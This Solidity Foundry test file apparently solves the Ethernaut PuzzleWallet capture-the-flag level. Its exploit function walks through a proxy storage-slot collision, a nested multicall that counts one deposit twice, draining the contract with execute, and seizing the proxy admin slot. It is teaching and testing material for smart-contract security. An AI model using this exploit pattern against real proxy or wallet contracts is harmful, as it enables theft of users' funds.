// SPDX-License-Identifier: Unlicense
pragma solidity >=0.8.0;
pragma experimental ABIEncoderV2;

import "lib/forge-std/src/BaseTest.sol";
import {PuzzleWalletFactory, PuzzleWallet, PuzzleProxy} from "src/levels/24-PuzzleWallet/PuzzleWalletFactory.sol";

contract TestPuzzleWallet is BaseTest {
    PuzzleProxy private level;
    PuzzleWallet puzzleWallet;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new PuzzleWalletFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(
            this.createLevelInstance{value: 0.001 ether}(true)
        );
        level = PuzzleProxy(levelAddress);
        puzzleWallet = PuzzleWallet(address(level));

        // Check that the contract is correctly setup
        assertEq(level.admin(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        emit log_string(
            "--------------------------------------------------------------------------"
        );

        emit log_named_address("Attacker address", player);

        emit log_string(
            "--------------------------------------------------------------------------"
        );

        emit log_named_address("Admin address before attack", level.admin());

        emit log_named_address(
            "Owner address before attack",
            puzzleWallet.owner()
        );

        emit log_named_address(
            "Pending admin address before attack",
             level.pendingAdmin()
        );

        emit log_string(
            "--------------------------------------------------------------------------"
        );

        // 1. Attacker calls `proposeNewAdmin()` function to become owner of `PuzzleWallet` contract.
        level.proposeNewAdmin(player);

        emit log_named_address(
            "Pending admin address after first attack",
             level.pendingAdmin()
        );

        emit log_named_address(
            "Owner address after first attack",
            puzzleWallet.owner()
        );

        emit log_named_address(
            "Admin address after first attack",
            level.admin()
        );

        emit log_string(
            "--------------------------------------------------------------------------"
        );

        // 2. Attacker calls `addToWhitelist()` to whitelist his address.
        puzzleWallet.addToWhitelist(player);

        emit log_named_uint(
            "Balance of contract before second attack",
            address(puzzleWallet).balance
        );

        // 3. Attacker batches call payload using `multicall()` function to deposit more ether than he has.
        bytes[] memory dataArraySecondCall = new bytes[](1);
        dataArraySecondCall[0] = abi.encodeWithSelector(
            puzzleWallet.deposit.selector
        );

        bytes[] memory dataArray = new bytes[](2);

        dataArray[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);
        dataArray[1] = abi.encodeWithSelector(
            puzzleWallet.multicall.selector,
            dataArraySecondCall
        );
        puzzleWallet.multicall{value: 0.001 ether}(dataArray);

        // 4. Attacker drains the contract balance by calling `execute()`.

        puzzleWallet.execute(player, address(puzzleWallet).balance, "");

        emit log_named_uint(
            "Balance of contract after second attack",
            address(puzzleWallet).balance
        );

        // 5. Attacker calls `setMaxBalance()` to become the `admin` of the `PuzzleProxy`.
        puzzleWallet.setMaxBalance(uint256(uint160(address(player))));

        emit log_named_address("Admin address after attack", level.admin());

        // Test assertion
        assertEq(level.admin(), player);

        vm.stopPrank();
    }
}
